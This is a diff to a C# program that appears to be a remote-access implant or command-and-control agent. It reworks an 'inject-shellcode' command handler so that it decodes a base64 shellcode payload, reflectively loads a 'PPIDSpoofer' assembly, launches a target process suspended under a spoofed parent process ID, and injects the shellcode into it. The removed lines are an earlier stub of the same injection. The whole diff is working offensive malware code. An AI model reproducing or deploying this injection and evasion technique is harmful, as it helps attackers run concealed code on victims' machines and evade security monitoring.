@@ -392,27 +392,21 @@ public class Program
             
             if (c.ToLower().StartsWith("inject-shellcode")){
               
-              string migrate = Regex.Replace(c, "inject-shellcode ", "", RegexOptions.IgnoreCase);
-              migrate = Regex.Replace(migrate, "inject-shellcode", "", RegexOptions.IgnoreCase);
-              if (!String.IsNullOrEmpty(migrate)) {
-                Program.proc = migrate;
+              string newProc = Regex.Replace(c, "inject-shellcode ", "", RegexOptions.IgnoreCase);
+              newProc = Regex.Replace(newProc, "inject-shellcode", "", RegexOptions.IgnoreCase);
+              if (!String.IsNullOrEmpty(newProc) && newProc.Length > 5) {
+                 Program.proc = newProc;
               }
-              output = scode + Program.proc;
+                            
+              var stringOutput = new StringWriter();
+              Console.SetOut(stringOutput);
+              byte[] payload = Convert.FromBase64String(Program.scode);
               
-              object[] args = new object[3];
-              args[0] = null; // parent process id
-              args[1] = @"c:\windows\system32\netsh.exe"; //process name
-              args[2] = true; //suspended?
-              
-              var loadedType = LoadSomething("ProcHandler, Inject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-              var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
-              output = xxx.ToString();
-              
-              // OpenProcess
-              // VirtualAllocEx
-              // WriteProcessMemory
-              // CreateRemoteThread
-              
+              var loadedType = LoadSomething("PPIDSpoofer, Inject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+              uint procID = (uint)loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("SharpCreateProcess", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  null, Program.proc, true}, null, null, null);
+              var procShellcode = loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("InjectShellcode", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  (int)procID, payload}, null, null, null);
+              output = stringOutput.ToString();
+            
             }
 
             if (c.ToLower() == "ps"){
